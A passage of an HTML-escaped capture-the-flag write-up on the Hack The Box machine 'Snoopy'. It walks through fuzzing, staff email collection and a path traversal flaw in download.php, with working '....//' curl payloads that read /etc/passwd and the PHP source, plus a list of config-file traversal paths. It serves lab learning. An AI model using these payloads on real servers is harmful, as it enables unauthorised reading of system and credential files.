+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 tralsesec tralsesec 27127 May 16 12:09  press_release.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://snoopy.htb/download?file=../../../../../etc/passwd&lt;/code&gt; generated an empty zip:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 tralsesec tralsesec     0 May 16 12:12 &lt;span class=&quot;s1&quot;&gt;&apos;press_release (2).zip&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Indicating that the webapp does sanitize the input. The question is just how well it does it.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://snoopy.htb/contact.html&lt;/code&gt;
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-2.png&quot; alt=&quot;snoopy-2.htb&quot; /&gt;
+Add that to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://snoopy.htb/team.html&lt;/code&gt; provides some possible usernames and emails:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Charles Schultz
+Chief Executive Officer
+cschultz@snoopy.htb
+
+Sally Brown
+Product Manager
+sbrown@snoopy.htb
+
+Harold Angel
+CTO
+hangel@snoopy.htb
+
+Lucy Van Pelt
+Accountant
+lpelt@snoopy.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-3.png&quot; alt=&quot;snoopy-3.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://mm.snoopy.htb/landing#/&lt;/code&gt;
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-4.png&quot; alt=&quot;snoopy-4.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mattermost&lt;/code&gt; which is a chat application used by teams - something like Slack/MS Teams.&lt;/p&gt;
+
+&lt;p&gt;Clocking on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;View in Browser&lt;/code&gt; it shows us this (we have to find valid creds):
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-5.png&quot; alt=&quot;snoopy-5.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Searching for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mattermost Exploit&lt;/code&gt; I only find authenticated vulnerabilities and one unauthenticated but which requires the knowledge of a correct UID:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-6.png&quot; alt=&quot;snoopy-6.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we neither have a valid UID nor are authenticated, it does not even make sense to go down this route (we don’t even know whether they work or whether the target is exploitable in the first place). We have to dig further.&lt;/p&gt;
+
+&lt;p&gt;Directory fuzzing:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; ffuf &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt;/FUZZ &lt;span class=&quot;nt&quot;&gt;-fs&lt;/span&gt; 503 | &lt;span class=&quot;nb&quot;&gt;tee&lt;/span&gt; ./ffuf/dir.scan
+
+        /&lt;span class=&quot;s1&quot;&gt;&apos;___\  /&apos;&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;&apos;___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://jeeves.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 503
+________________________________________________
+
+:: Progress: [220560/220560] :: Job [1/1] :: 1092 req/sec :: Duration: [0:02:39] :: Errors: 0 ::
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;vhosts fuzzing:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; ffuf &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt;/ &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: FUZZ.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fs&lt;/span&gt; 23418 | &lt;span class=&quot;nb&quot;&gt;tee&lt;/span&gt; ./ffuf/vhosts.scan
+
+        /&lt;span class=&quot;s1&quot;&gt;&apos;___\  /&apos;&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;&apos;___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://snoopy.htb/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.snoopy.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 23418
+________________________________________________
+
+mm                      [Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 51ms]
+:: Progress: [114442/114442] :: Job [1/1] :: 823 req/sec :: Duration: [0:02:20] :: Errors: 0 ::
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nothing new.&lt;/p&gt;
+
+&lt;p&gt;In the meantime, taking a look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;announcement.pdf&lt;/code&gt; doesn’t expose new information of high interest:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-7.png&quot; alt=&quot;snoopy-7.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-8.png&quot; alt=&quot;snoopy-8.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Only exposing a new information: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pr@snoopy.htb&lt;/code&gt; / &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sally Brown&lt;/code&gt; which is the Product Manager as we found out before (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sbrown@snoopy.htb&lt;/code&gt;). During a pentest, it’s vital to assess not just the technical layer, but also the procedural layer, as human workflows often form the weakest link.&lt;/p&gt;
+
+&lt;p&gt;So looking at the big picture, the only possible path right now seems to be the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mattermost&lt;/code&gt; vhost and its Password Reset Endpoint (as we couldn’t create new accounts). With the knowledge of some usernames and emails we have to try to reset a password of someone to gain the initial foothold.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;-2-initial-foothold&quot;&gt;🚪 2. Initial Foothold&lt;/h2&gt;
+
+&lt;p&gt;Trying with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sbrown@snoopy.htb&lt;/code&gt; let’s see what happens:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-9.png&quot; alt=&quot;snoopy-9.htb&quot; /&gt;
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-10.png&quot; alt=&quot;snoopy-10.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Maybe the email doesn’t exist. Let’s try &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pr@snoopy.htb&lt;/code&gt;:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-11.png&quot; alt=&quot;snoopy-11.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s search for some known vulnerabilities:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-12.png&quot; alt=&quot;snoopy-12.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We have to find the version of that Mattermost instance. As it is not very obvious, we have to dig through the html/js source in order to find some leftbehinds:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-13.png&quot; alt=&quot;snoopy-13.htb&quot; /&gt;
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-14.png&quot; alt=&quot;snoopy-14.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Version &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7.9.0&lt;/code&gt;. Let’s quickly verify that date against the Github commits for that version:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-15.png&quot; alt=&quot;snoopy-15.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Mar 15-Mar 16 is a perfect match. The running version &lt;em&gt;is indeed&lt;/em&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7.9.0&lt;/code&gt;.
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-16.png&quot; alt=&quot;snoopy-16.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bingo!!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-17.png&quot; alt=&quot;snoopy-17.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No public exploits and it seems to be an authenticated issue. So probably the last open door is that download functionality. Let’s try some payloads:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-18.png&quot; alt=&quot;snoopy-18.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Indeed. Doesn’t seem to be as strong as it is said in the Document lol. A new file! &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snoopysec_marketing.mp4&lt;/code&gt;.
+Yeah, looking at it it’s not that interesting just a video-form of that pdf. We have to search for other files!&lt;/p&gt;
+
+&lt;p&gt;Trying a bunch of different payloads we finally made it happen: We found an LFI vulnerability!&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;s1&quot;&gt;&apos;http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//....//etc//passwd&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt; etc_passwd.zip                                                                                                        
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100    798 100    798   0      0  12902      0                              0
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip etc_passwd.zip &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; etcpasswd/
+Archive:  etc_passwd.zip
+  inflating: etcpasswd/press_package/etc/passwd
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;etcpasswd/press_package/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt;:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
+sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
+clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin
+lpelt:x:1003:1004::/home/lpelt:/bin/bash
+cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
+vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
+&lt;span class=&quot;nb&quot;&gt;bind&lt;/span&gt;:x:108:113::/var/cache/bind:/usr/sbin/nologin
+_laurel:x:999:998::/var/log/laurel:/bin/false
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-19.png&quot; alt=&quot;snoopy-19.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The generated zip’s internal path also leaks how the webapp directory structure looks like: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;press_package/etc/passwd&lt;/code&gt;. To verify this, we can request the following:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;s1&quot;&gt;&apos;http://snoopy.htb/download?file=....//obviously_not_existing//announcement.pdf&apos;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;s1&quot;&gt;&apos;http://snoopy.htb/download?file=....//press_package//announcement.pdf&apos;&lt;/span&gt;                                                                                                                                                                        
+Warning: Binary output can mess up your terminal. Use &lt;span class=&quot;s2&quot;&gt;&quot;--output -&quot;&lt;/span&gt; to tell curl to output it to your terminal anyway, or consider &lt;span class=&quot;s2&quot;&gt;&quot;--output &amp;lt;FILE&amp;gt;&quot;&lt;/span&gt; to save to a file.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-20.png&quot; alt=&quot;snoopy-20.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see, the first request generated nothing as that path doesn’t exist. But the second one spits out the pdf. Using that technique we can figure out the entire project directory structure which becomes very handy when searching for source code and config files.&lt;/p&gt;
+
+&lt;p&gt;There’s also a faster and more reliable way: by reading the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nginx&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache2&lt;/code&gt; configs. Always keep these paths in your pocket:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;….//….//….//….//….//etc/nginx/nginx.conf&lt;/li&gt;
+  &lt;li&gt;….//….//….//….//….//etc/nginx/sites-enabled/default&lt;/li&gt;
+  &lt;li&gt;….//….//….//….//….//etc/nginx/sites-available/default&lt;/li&gt;
+  &lt;li&gt;….//….//….//….//….//etc/apache2/apache2.conf&lt;/li&gt;
+  &lt;li&gt;….//….//….//….//….//etc/httpd/conf/httpd.conf&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/nginx/sites-available/default&lt;/code&gt; leaks the following file:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-21.png&quot; alt=&quot;snoopy-21.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can verify whether the path is correct or not:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;s1&quot;&gt;&apos;http://snoopy.htb/download?file=....//....//....//....//....//var/www/html/download.php&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt; file.zip                                                                                                                                    
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100    595 100    595   0      0   9650      0                              0
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip file.zip &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; file
+Archive:  file.zip
+  inflating: file/press_package/var/www/html/download.php
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;file/press_package/var/www/html/download.php
+&amp;lt;?php
+
+&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;file&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;press_package/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$archive&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; tempnam&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys_get_temp_dir&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;archive&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$zip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new ZipArchive&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$zip&lt;/span&gt;-&amp;gt;open&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$archive&lt;/span&gt;, ZipArchive::CREATE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;isset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; preg_replace&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/\.\.\//&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$filecontent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_exists&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filecontent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filecontent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;.&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filecontent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;..&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nv&quot;&gt;$content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; preg_replace&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/\.\.\//&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$filecontent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;nv&quot;&gt;$zip&lt;/span&gt;-&amp;gt;addFile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filecontent&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$files&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; scandir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        foreach &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$files&lt;/span&gt; as &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;.&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;..&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                        &lt;span class=&quot;nv&quot;&gt;$zip&lt;/span&gt;-&amp;gt;addFile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$zip&lt;/span&gt;-&amp;gt;close&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Content-Type: application/zip&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Disposition: attachment; filename=press_release.zip&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
